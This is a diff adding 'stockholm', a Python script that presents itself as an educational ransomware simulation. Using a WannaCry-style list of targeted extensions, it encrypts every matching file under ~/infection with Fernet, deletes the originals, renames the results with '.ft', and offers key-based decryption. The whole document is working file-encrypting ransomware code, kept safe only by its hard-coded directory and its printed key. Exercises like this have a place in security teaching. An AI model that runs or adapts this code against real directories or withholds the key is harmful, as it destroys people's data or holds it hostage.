@@ -1,0 +1,100 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import argparse
+from cryptography.fernet import Fernet
+
+VERSION = "1.0.0"
+INFECTION_DIR = os.path.join(os.path.expanduser("~"), "infection")
+
+WANNACRY_EXTENSIONS = {
+    ".doc", ".docx", ".docb", ".docm", ".dot", ".dotm", ".dotx",
+    ".xls", ".xlsx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm",
+    ".ppt", ".pptx", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm",
+    ".pst", ".ost", ".msg", ".eml", ".edb",
+    ".vsd", ".vsdx", ".sldx", ".sldm",
+    ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg",
+    ".onetoc2", ".snt", ".hwp", ".602", ".mml",
+    ".jpeg", ".jpg", ".png", ".bmp", ".gif", ".raw", ".tif", ".tiff", ".nef", ".psd",
+    ".sxi", ".sti", ".sxd", ".sxm", ".otg", ".odg", ".otp", ".odp", ".odt", ".ods", ".uop", ".lay", ".lay6",
+    ".vdi", ".vmdk", ".vmx",
+    ".gpg", ".aes", ".arc", ".asc", ".bz2", ".gz", ".lz", ".tgz", ".zip", ".rar", ".tar", ".7z",
+    ".bak", ".tb",
+    ".p12", ".pfx", ".pem", ".p7b", ".p7c", ".der", ".cer", ".crt",
+    ".py", ".c", ".h", ".cpp", ".cs", ".js", ".ts", ".html", ".css",
+    ".php", ".rb", ".java", ".go", ".rs", ".swift", ".sql", ".db", ".sqlite", ".sqlite3",
+    ".mp3", ".mp4", ".avi", ".mov", ".mkv", ".flac", ".wav", ".ogg",
+    ".iso", ".deb", ".rpm",
+}
+
+
+def encrypt_files(key, silent):
+    fernet = Fernet(key)
+    for root, _, files in os.walk(INFECTION_DIR):
+        for filename in files:
+            path = os.path.join(root, filename)
+            _, ext = os.path.splitext(filename)
+            if ext == ".ft" or ext.lower() not in WANNACRY_EXTENSIONS:
+                continue
+            try:
+                with open(path, "rb") as f:
+                    data = f.read()
+                new_path = path + ".ft"
+                with open(new_path, "wb") as f:
+                    f.write(fernet.encrypt(data))
+                os.remove(path)
+                if not silent:
+                    print(f"{path} -> {new_path}")
+            except Exception as e:
+                print(f"Error: {path}: {e}", file=sys.stderr)
+
+
+def decrypt_files(key, silent):
+    try:
+        fernet = Fernet(key)
+    except Exception:
+        print("Error: invalid key.", file=sys.stderr)
+        sys.exit(1)
+    for root, _, files in os.walk(INFECTION_DIR):
+        for filename in files:
+            if not filename.endswith(".ft"):
+                continue
+            path = os.path.join(root, filename)
+            try:
+                with open(path, "rb") as f:
+                    data = f.read()
+                original = path[:-3]
+                with open(original, "wb") as f:
+                    f.write(fernet.decrypt(data))
+                os.remove(path)
+                if not silent:
+                    print(f"{path} -> {original}")
+            except Exception as e:
+                print(f"Error: {path}: {e}", file=sys.stderr)
+
+
+def main():
+    if not os.path.isdir(INFECTION_DIR):
+        print(f"Error: '{INFECTION_DIR}' does not exist.", file=sys.stderr)
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(prog="stockholm", add_help=False,
+        description="Harmless ransomware simulation for educational purposes.")
+    parser.add_argument("-h", "--help", action="help")
+    parser.add_argument("-v", "--version", action="version", version=f"stockholm {VERSION}")
+    parser.add_argument("-r", "--reverse", metavar="KEY", help="Decrypt files using the provided key.")
+    parser.add_argument("-s", "--silent", action="store_true", help="No output.")
+    args = parser.parse_args()
+
+    if args.reverse:
+        decrypt_files(args.reverse.encode(), args.silent)
+    else:
+        key = Fernet.generate_key()
+        if not args.silent:
+            print(f"Key: {key.decode()}")
+        encrypt_files(key, args.silent)
+
+
+if __name__ == "__main__":
+    main()
